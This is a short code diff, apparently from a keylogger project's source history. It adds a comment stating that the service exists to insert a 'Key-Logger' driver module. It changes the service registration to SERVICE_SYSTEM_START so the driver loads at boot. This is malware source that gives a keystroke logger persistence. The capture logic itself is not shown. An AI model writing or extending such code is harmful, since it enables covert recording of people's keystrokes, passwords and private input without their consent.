@@ -22,9 +22,13 @@ m_pDataBase(NULL)
 	lpServiceFilePath = strServiceFilePath.c_str();
 #endif
 
+	/*
+		Service is created for inserting driver module (Key-Logger)
+		So, We use SERVICE_SYSTEM_START parameter for registering service
+	*/
 	LPTSTR lpServiceName = _T(SERVICE_NAME);
 	DWORD dwRet;
-	dwRet = m_pService->InitSvc(lpServiceFilePath, lpServiceName, lpServiceName, 0);
+	dwRet = m_pService->InitSvc(lpServiceFilePath, lpServiceName, lpServiceName, SERVICE_SYSTEM_START);
 	if (dwRet != SVC_OK) {
 		ErrorLog("Fail to Init service [%s:%d]", __FUNCTION__, __LINE__);
 		return;
